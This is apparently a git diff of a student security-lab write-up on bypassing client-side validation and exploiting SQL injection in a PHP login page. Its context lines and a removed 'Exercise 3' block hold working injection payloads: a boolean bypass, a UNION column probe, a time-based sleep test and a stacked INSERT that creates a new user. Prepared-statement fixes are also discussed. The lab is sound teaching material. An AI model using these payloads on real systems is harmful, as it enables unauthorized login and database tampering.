@@ -14,8 +14,8 @@
 
 ### Exercise 2: : Client/Server Side Scripting
 
-__1 :__  Identify a mechanism which protects the login process (not on the server) and
-briefly describe the general security problem with this implementation.
+__1 : Identify a mechanism which protects the login process (not on the server) and
+briefly describe the general security problem with this implementation.__
 __Solution:__ 
 -   The client side script restricts the user input to avoid any kind of injection or malicious payload that can be entered through the input form.
 The following check is responsible for validation:
@@ -74,7 +74,7 @@ __2.__
 ![validation-bypass](https://raw.githubusercontent.com/shashihacks/oscp-new/master/Security%20Insider%20Lab-2/assets/validation_bypass.PNG?token=AD4TE53ABTNEZCNJDB4SXJ3ASECMC)
 
 3. __Better solution:__
-    - Validate the user input on the server side and return if input is other than the whitelisted characters  or use the mysql
+    - Validate the user input on the server side and return if input is other than the whitelisted characters  
 
     __Replace:__
     ```php
@@ -147,7 +147,7 @@ GET /htdocs/login.php?username=testuser&password=testpass'+or+'1'='1
         ```sql
             $stmt = mysqli_prepare($dbc, "SELECT * FROM users WHERE username = ? AND password = ?");
                 mysqli_stmt_bind_param($stmt, "s", $username);
-                mysqli_stmt_bind_param($stmt, "s", $userpass);
+                mysqli_stmt_bind_param($stmt, "s", $password);
                 mysqli_stmt_execute($stmt);
  
         ```  
@@ -224,7 +224,7 @@ __Solution:__
         ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#   
     ```
 
-    - The above queries are concatenated to the username parameter(shown below) and send one by one, all the payloads resulted in login failures and error messages, except when `SELECT` followed by 8 `NULL`, thus results the table has 8 columns.
+    - The above queries are concatenated to the username parameter(shown below) and sent one by one, all the payloads resulted in login failures and error messages, except when `SELECT` followed by 8 `NULL`, thus results the table has 8 columns.
     ```php
     GET /htdocs/login.php?username=alex%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&password=test123 
     ```
@@ -254,7 +254,7 @@ __Solution:__
 __2. Briefly describe the actions required to create a new user.__
 
 __solution__ 
-- Since tablename, columnanmes are known, append to the login request by terminating the username query and by insert the new user.
+- Since tablename, column names are known, append to the login request by terminating the username query and by insert the new user.
     payload used
 
     ```php
@@ -430,38 +430,6 @@ __Solution:__
 
 
 
-
-
-
-### Exercise 3 
-following query works
-```php
-GET /htdocs/login.php?username=alex&password=test'%20or%20sleep%285%29%23
-```
-
-works
-select * from users WHERE username='alex' or 1=1 UNION select 1,2,3,4,5,6,7,8
-
-- ```GET /htdocs/login.php?username=test'%20or%20exists(SELECT%201%20%20FROM%20users%20limit%201)%23&password=asd ```
-when `db_users` is used user doesn;t login
-```
-GET /htdocs/login.php?username=test' or exists(SELECT 1  FROM users limit 1)#&password=asd 
-```
-
-- the following query works for union selec
-```php
-GET /htdocs/login.php?username=alex' or '1'='1 UNION select 1,2,3,4,5,6,7,8#&password=asd
-```
-
-- following query works to insert username and password
-```sql
-SELECT * FROM `users` WHERE username="alex" ; INSERT INTO users(id, username, password) VALUES(77,"metest", "metest")
-```
-
-- query used to insert values
-```php
-GET /htdocs/login.php?username=alex'%3B%20INSERT%20INTO%20users(id%2C%20username%2C%20password)%20VALUES(77%2C%22metest%22%2C%20%22metest%22)%23&password=asd
-```
 <br></br><br></br><br></br><br></br><br></br><br></br><br></br>
     
         
